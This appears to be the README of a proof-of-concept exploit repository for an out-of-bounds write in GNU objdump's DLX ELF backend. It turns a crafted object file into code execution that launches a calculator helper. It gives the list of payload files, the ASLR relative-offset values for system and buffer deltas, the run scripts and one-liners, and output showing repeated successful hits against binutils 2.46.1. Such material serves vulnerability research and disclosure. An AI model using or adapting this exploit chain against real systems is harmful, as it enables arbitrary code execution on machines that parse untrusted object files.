As mentioned before, https://github.com/4D4J/objdump-Out-Of-Bounds-write beat me to this finding. Please support his repo. He deserves it, great PoC with FULL ASLR bypass 

# objdump dlx calc poc

Small repro for an `objdump -g` crash-to-calc path in the DLX ELF backend.

This is an ACE-style local parser bug: the input is a crafted ELF/DLX object file, and the trigger is running `objdump` on it. It is not a network RCE by itself. The demo payload starts the tiny helper named `P`, and that helper opens calculator.

Tested against a binutils-gdb master build from commit:

```text
c311f4d37f31ff3fbb5db6923abcdf93bb75a37b
```

Also validated against the official GNU Binutils 2.46.1 release tarball with a
clean `dlx-elf` objdump build:

```text
GNU objdump (GNU Binutils) 2.46.1
elf32-dlx
```

## whats in here

- `payloads/*.bin` - crafted ELF/DLX object files to feed to `objdump`
- `payloads/*.notes` - notes for each generated payload variant
- `P` - helper script that writes `calc_hit.log` and starts Windows calculator from WSL
- `run_dlx_calc_poc.sh` - tries the payload variants until one hits
- `generate_objdump_dlx_calc_poc.py` - regenerates the payload variants
- `dlx_chain_builder.py` - small builder used by the generator
- `docs/aslr-bypass-analysis.md` - notes on why this is profile-dependent
- `tools/search_pointer_transform.py` - Z3 sanity check for fixed pointer transforms
- `tools/aslr_delta_coverage.py` - lists the libc low-32 delta coverage used by the generator

The payload files are named `.bin` because they are raw binary files, but the file format inside is ELF/DLX.

## why there are multiple payloads

ASLR stays on. Because of that, one exact payload is not guaranteed to land every time. The files in `payloads/` are a small set of guesses for the address layout seen during testing.

The generator emits the original profile, a WSL/Ubuntu 24.04 profile measured
against the pinned `dlx-elf` build, and a profile measured against a clean GNU
Binutils 2.46.1 `dlx-elf` build. The profiles keep ASLR on but use stable
relative offsets observed in the target process:

```text
layout=wsl2404 off_io=-0x3690 off_sec=0xbb0 rbase=0x220
buf_delta=0x702fff00 or 0x6f300000
system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff

layout=gnu2461 off_io=-0x3690 off_sec=0xbb8 rbase=0x190 sec_size_offset=0x40
buf_delta=0x702fff00 or 0x6f300000
system_delta=0x7042e500, 0x6f42e600, 0x7043e4ff, 0x6f43e5ff, 0x7043e5ff, or 0x6f43e6ff
```

That is an ASLR-on relative-delta strategy, not a universal single-shot info-leak bypass. The six `system_delta` values cover every page-aligned low-32-bit libc base for the documented `_IO_2_1_stderr_` and `system` offsets. A miss can still happen if the heap/libio profile or libc build does not match, so the runner keeps the retry loop.

More detail is in `docs/aslr-bypass-analysis.md`.

The expanded `gnu2461` profile was validated with the existing runner against a
clean GNU Binutils 2.46.1 `dlx-elf` objdump build:

```text
HIT try=1 payload=payloads/dlx_calc_aslr_gnu2461_f06_b702fff00_s7042e500.bin
CALC_HELPER_RAN 2026-06-25T11:19:07Z
```

A ten-run one-sweep stability pass against the same clean build also hit every
run:

```text
hits=10/10
CALC_HELPER_RAN 2026-06-25T11:19:31Z
```

So a plain crash like this does not always mean the PoC failed:

```text
Segmentation fault (core dumped)
```

The useful signal is either calculator opening, or `calc_hit.log` getting a fresh `CALC_HELPER_RAN ...` line.

## quick run

From WSL:

```bash
cd /path/to/objdump-dlx-calc-poc
chmod +x P
export PATH="$PWD:$PATH"
MAX_TRIES=50 bash run_dlx_calc_poc.sh /path/to/objdump
cat calc_hit.log
```

Example with a local binutils build:

```bash
MAX_TRIES=50 bash run_dlx_calc_poc.sh /opt/binutils-master/binutils/objdump
```

## manual run without the helper loop

If you want to do the same thing by hand and keep ASLR on:

```bash
cd /path/to/objdump-dlx-calc-poc
chmod +x P
export PATH="$PWD:$PATH"
rm -f calc_hit.log

for p in payloads/*.bin; do
  echo "$p"
  /path/to/objdump -g "$p" >/dev/null 2>&1 || true
  if [ -s calc_hit.log ]; then
    echo "HIT $p"
    cat calc_hit.log
    break
  fi
done
```

Same thing as a one-liner:

```bash
rm -f calc_hit.log; for p in payloads/*.bin; do echo "$p"; /path/to/objdump -g "$p" >/dev/null 2>&1 || true; if [ -s calc_hit.log ]; then echo "HIT $p"; cat calc_hit.log; break; fi; done
```

## regenerating payloads

```bash
rm -rf payloads
python3 generate_objdump_dlx_calc_poc.py --out-dir payloads
```

The runner will also regenerate `payloads/` automatically if the folder is missing or empty.

## what the bug is doing

At a high level, the crafted DLX object gives `objdump -g` relocation data that causes the DLX backend to write outside the intended debug section while processing relocations. The PoC shapes those writes so that, when the process layout lines up, control flow reaches the helper command `P`.

That is why `PATH` matters. The helper is run by name, so this line is needed:

```bash
export PATH="$PWD:$PATH"
```

Without it, you can still get the segfault, but the helper might not be found.

## cleanup

Runtime files are not needed:

```bash
rm -f calc_hit.log objdump-poc.out
```

The generated crash after a hit is expected. The process usually does not exit cleanly after the helper is reached.
